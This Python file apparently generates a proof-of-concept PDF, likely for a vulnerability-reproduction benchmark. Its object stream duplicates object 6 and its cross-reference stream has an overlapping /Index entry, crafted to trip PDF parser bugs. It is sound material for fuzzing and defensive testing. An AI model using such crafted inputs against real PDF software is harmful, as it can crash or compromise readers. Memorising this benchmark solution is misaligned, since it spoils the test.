import struct
from typing import Dict, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"

        def ind_obj(num: int, body: bytes) -> bytes:
            return (f"{num} 0 obj\n".encode("ascii") + body + b"\nendobj\n")

        def stream_obj(num: int, dict_bytes: bytes, data: bytes) -> bytes:
            return (
                f"{num} 0 obj\n".encode("ascii")
                + dict_bytes
                + b"\nstream\n"
                + data
                + b"\nendstream\nendobj\n"
            )

        parts: List[bytes] = [header]
        offsets: Dict[int, int] = {}

        # 1: Catalog
        obj1 = b"<< /Type /Catalog /Pages 2 0 R >>"
        # 2: Pages
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        # 3: Page references compressed object 6 for /Resources
        obj3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources 6 0 R >>"
        # 4: Empty contents
        obj4_dict = b"<< /Length 0 >>"
        obj4_data = b""

        # 5: Object stream with duplicate entries for object 6
        obj6_bytes = b"<< /ProcSet [/PDF] >>\n"
        obj6_bytes2 = b"<< /ProcSet [/PDF] >>\n"
        off2 = len(obj6_bytes)
        objstm_header = f"6 0 6 {off2} ".encode("ascii")
        objstm_first = len(objstm_header)
        objstm_data = objstm_header + obj6_bytes + obj6_bytes2
        objstm_len = len(objstm_data)
        obj5_dict = f"<< /Type /ObjStm /N 2 /First {objstm_first} /Length {objstm_len} >>".encode("ascii")

        # Build objects 1-5
        for num, body in [
            (1, obj1),
            (2, obj2),
            (3, obj3),
        ]:
            offsets[num] = sum(len(p) for p in parts)
            parts.append(ind_obj(num, body))

        offsets[4] = sum(len(p) for p in parts)
        parts.append(stream_obj(4, obj4_dict, obj4_data))

        offsets[5] = sum(len(p) for p in parts)
        parts.append(stream_obj(5, obj5_dict, objstm_data))

        # XRef stream object number
        xref_objnum = 7
        offsets[xref_objnum] = sum(len(p) for p in parts)

        # Build xref stream data with overlapping /Index to duplicate object 6 entry
        # /Index [0 8 6 1] => objects 0..7 plus an extra entry for object 6
        # W = [1 4 2] => 7 bytes per entry
        def xref_entry(t: int, f2: int, f3: int) -> bytes:
            return struct.pack(">B", t) + struct.pack(">I", f2 & 0xFFFFFFFF) + struct.pack(">H", f3 & 0xFFFF)

        xref_entries: List[bytes] = []
        # obj 0: free
        xref_entries.append(xref_entry(0, 0, 0xFFFF))
        # obj 1-5: in-use
        for objn in range(1, 6):
            xref_entries.append(xref_entry(1, offsets[objn], 0))
        # obj 6: compressed in objstm 5, index 0
        xref_entries.append(xref_entry(2, 5, 0))
        # obj 7: xref stream itself
        xref_entries.append(xref_entry(1, offsets[xref_objnum], 0))
        # duplicate entry for obj 6: compressed in objstm 5, index 1
        xref_entries.append(xref_entry(2, 5, 1))

        xref_data = b"".join(xref_entries)
        xref_len = len(xref_data)

        xref_dict = (
            b"<< /Type /XRef"
            b" /Size 8"
            b" /Root 1 0 R"
            b" /W [1 4 2]"
            b" /Index [0 8 6 1]"
            + f" /Length {xref_len} >>".encode("ascii")
        )

        parts.append(stream_obj(xref_objnum, xref_dict, xref_data))

        startxref = offsets[xref_objnum]
        parts.append(f"startxref\n{startxref}\n%%EOF\n".encode("ascii"))

        return b"".join(parts)